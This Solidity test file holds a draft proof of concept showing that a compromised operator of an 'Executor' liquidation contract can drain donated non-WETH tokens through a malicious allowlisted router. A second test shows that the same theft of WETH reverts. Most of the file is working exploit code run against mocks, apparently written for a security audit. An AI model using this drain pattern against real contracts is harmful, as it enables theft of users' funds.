// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import {ExecutorTestBase} from "../unit/Base.sol";
import {PlanBuilder as PB} from "../unit/PlanBuilder.sol";
import {MockERC20, MockRouter} from "../unit/Mocks.sol";
import {Executor} from "../../src/Executor.sol";

/// Malicious allowlisted router: pulls approved tokens to an attacker.
/// Models SwapRouter02 calldata with an arbitrary `recipient` under exact approval.
contract DrainRouter {
    function steal(address token, address to, uint256 amount) external {
        require(MockERC20(token).transferFrom(msg.sender, to, amount), "drain");
    }
}

/*
 * [DRAFT] Compromised OPERATOR drains standing non-WETH via S_ROUTER + L_TAKE_BALANCE.
 *
 * Profit guard only constrains WETH balance delta. A donated/stuck ERC-20 is
 * fully approvable to ROUTER_A/B and sent wherever router calldata directs.
 */
contract OperatorRouterDrainPoC is ExecutorTestBase {
    DrainRouter internal drainRouter;
    address internal attacker = makeAddr("attacker");

    function setUp() public override {
        // Minimal world then redeploy Executor with DrainRouter as ROUTER_A.
        super.setUp();
        drainRouter = new DrainRouter();
        ex = new Executor(
            operator,
            sink,
            address(factory),
            factory.initHash(),
            address(drainRouter),
            address(routerB),
            address(weth),
            v2Factory,
            V2_HASH,
            sushiFactory,
            SUSHI_HASH,
            address(curveRegistry)
        );
        // Re-seed Aave liquidity after redeploy (same as Base, pool already funded).
        pool.setPosition(borrower, 0.95e18, REPAY, COLL_OUT);
    }

    function test_poc_operator_drains_standing_non_weth_via_router() public {
        uint256 standing = 1_000e6;
        debt.mint(address(ex), standing);
        assertEq(debt.balanceOf(address(ex)), standing, "pre: standing debt on executor");

        // Profit leg 0: steal entire standing DEBT to attacker (L_TAKE_BALANCE).
        // Profit leg 1: normal coll→WETH so the liquidation remains profitable.
        bytes memory stealLeg = PB.routerSwap(
            address(drainRouter),
            address(debt),
            address(debt), // tokenOut unused by DrainRouter.steal
            PB.L_TAKE_BALANCE,
            0,
            abi.encodeCall(DrainRouter.steal, (address(debt), attacker, standing))
        );
        // Note: L_TAKE_BALANCE sets amount from balance; steal calldata uses fixed standing.
        // Re-encode steal with amount matching balance at call time — use max pull via amount=0 flag:
        // Router sees approve(balance); we encode steal with type(uint256).max? MockERC20 transferFrom
        // needs exact amount. Use standing known a priori (same as donated).
        bytes memory profitLeg = PB.poolSwap(address(pCollWeth), address(coll), address(weth), PB.L_TAKE_BALANCE, 0);

        bytes memory plan = bytes.concat(
            PB.header(0, 0, 0, 0, 1), // no sweep; minProfit 0; gas 0
            PB.groupHead(PB.P_AAVE, address(pool), address(debt), REPAY, 1, 1),
            PB.legV3(address(pool), borrower, address(coll), REPAY),
            _repayLeg(),
            PB.profit(2, bytes.concat(stealLeg, profitLeg))
        );

        _exec(plan);

        assertEq(debt.balanceOf(attacker), standing, "attacker received standing non-WETH");
        assertEq(debt.balanceOf(address(ex)), 0, "executor standing drained");
        // Standing WETH guard still holds for WETH; this tx's WETH profit may remain on ex.
        assertGt(weth.balanceOf(address(ex)), 0, "liq WETH profit remains (not stolen by this path)");
    }

    function test_poc_standing_weth_theft_via_router_reverts() public {
        uint256 standingWeth = 5e18;
        weth.mint(address(ex), standingWeth);

        bytes memory stealWeth = PB.routerSwap(
            address(drainRouter),
            address(weth),
            address(weth),
            PB.L_TAKE_BALANCE,
            0,
            abi.encodeCall(DrainRouter.steal, (address(weth), attacker, standingWeth))
        );
        bytes memory profitLeg = PB.poolSwap(address(pCollWeth), address(coll), address(weth), PB.L_TAKE_BALANCE, 0);

        bytes memory plan = bytes.concat(
            PB.header(0, 0, 0, 0, 1),
            PB.groupHead(PB.P_AAVE, address(pool), address(debt), REPAY, 1, 1),
            PB.legV3(address(pool), borrower, address(coll), REPAY),
            _repayLeg(),
            PB.profit(2, bytes.concat(stealWeth, profitLeg))
        );

        // gross = wethAfter - wethBefore underflows when standing WETH leaves.
        vm.expectRevert();
        _exec(plan);
        assertEq(weth.balanceOf(address(ex)), standingWeth, "standing WETH intact after revert");
        assertEq(weth.balanceOf(attacker), 0, "attacker got no WETH");
    }
}
